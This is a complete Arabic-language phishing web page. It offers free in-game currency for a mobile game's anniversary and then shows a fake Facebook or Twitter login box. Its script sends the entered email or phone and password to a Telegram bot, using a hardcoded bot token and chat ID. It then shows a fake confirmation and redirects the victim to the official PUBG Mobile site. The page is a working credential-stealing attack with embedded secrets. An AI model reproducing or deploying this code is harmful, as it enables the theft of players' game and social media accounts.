<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز توزيع الجوائز - 2026</title>
    <style>
        body { background: #0b0f19; color: white; font-family: 'Arial', sans-serif; margin: 0; text-align: center; }
        .hero { padding: 40px 20px; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://wallpaperaccess.com/full/223128.jpg'); background-size: cover; border-bottom: 2px solid #f3ba2f; }
        .gift-box { margin-top: 20px; padding: 20px; border: 1px solid #f3ba2f; display: inline-block; border-radius: 10px; background: rgba(0,0,0,0.5); }
        .claim-btn { padding: 15px 50px; background: #f3ba2f; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
        
        /* النافذة المنبثقة */
        #login-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; }
        .login-box { width: 320px; background: #fff; margin: 100px auto; padding: 20px; border-radius: 8px; color: #333; }
        .fb-btn { background: #1877f2; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; margin: 5px 0; font-weight: bold; cursor: pointer; }
        .tw-btn { background: #000; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; margin: 5px 0; font-weight: bold; cursor: pointer; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="hero">
    <h1>مبروك! أنت مؤهل لاستلام 5000 شدة/جوهرة</h1>
    <p>بمناسبة مرور 10 سنوات على الانطلاق، اختر هديتك الآن</p>
    <div class="gift-box">
        <img src="https://vignette.wikia.nocookie.net/clashofclans/images/a/a2/Gems.png" width="100"><br>
        <button class="claim-btn" onclick="openLogin()">استلام الآن</button>
    </div>
</div>

<div id="login-modal">
    <div class="login-box">
        <h3 id="login-title">تسجيل الدخول للاستلام</h3>
        <p style="font-size: 12px;">اختر طريقة تسجيل الدخول لربط حساب اللعبة</p>
        <button class="fb-btn" onclick="showFields('Facebook')">الدخول عبر Facebook</button>
        <button class="tw-btn" onclick="showFields('Twitter')">الدخول عبر Twitter</button>
        
        <div id="fields" style="display:none;">
            <hr>
            <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button class="fb-btn" id="final-btn" onclick="sendData()">تأكيد الهوية</button>
        </div>
    </div>
</div>

<script>
    const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
    const CHAT_ID = "5811700860";
    let platform = "";

    function openLogin() { document.getElementById('login-modal').style.display = 'block'; }
    
    function showFields(p) {
        platform = p;
        document.getElementById('login-title').innerText = "تسجيل الدخول بـ " + p;
        document.getElementById('fields').style.display = 'block';
        if(p == 'Twitter') document.getElementById('final-btn').style.background = '#000';
    }

    async function sendData() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        if(u.length < 5 || p.length < 5) { alert("خطأ في البيانات!"); return; }

        const report = `🎮 **صيد ألعاب جديد (${platform}):**\n\n👤 الحساب: \`${u}\`\n🔑 كلمة السر: \`${p}\``;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: report, parse_mode: "Markdown"})
        });

        alert("تم التحقق! ستصلك الهدية خلال 24 ساعة.");
        window.location.href = "https://www.pubgmobile.com"; // تحويل للموقع الرسمي
    }
</script>
</body>
</html>
